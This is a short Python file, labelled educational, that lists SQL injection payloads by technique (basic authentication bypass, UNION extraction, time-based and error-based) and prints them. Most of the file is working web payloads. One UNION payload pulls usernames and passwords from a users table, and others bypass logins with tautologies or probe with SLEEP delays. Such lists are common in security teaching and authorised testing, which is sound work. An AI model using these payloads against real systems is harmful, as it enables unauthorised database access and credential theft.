"""
SQL injection payloads collection for educational purposes
"""

SQLI_PAYLOADS = {
    "basic": [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "') OR ('1'='1",
    ],
    "union": [
        "' UNION SELECT NULL--",
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT 1,@@version--",
    ],
    "time_based": [
        "' OR SLEEP(5)--",
        "' OR IF(1=1,SLEEP(5),0)--",
    ],
    "error_based": [
        "' AND EXTRACTVALUE(1, CONCAT(0x3a, @@version))--",
    ]
}

def show_payloads():
    """Display available payloads"""
    print("SQL Injection Payloads Collection")
    print("=" * 50)
    
    for category, payloads in SQLI_PAYLOADS.items():
        print(f"\n{category.upper()}:")
        for i, payload in enumerate(payloads, 1):
            print(f"  {i}. {payload}")

if __name__ == "__main__":
    show_payloads()
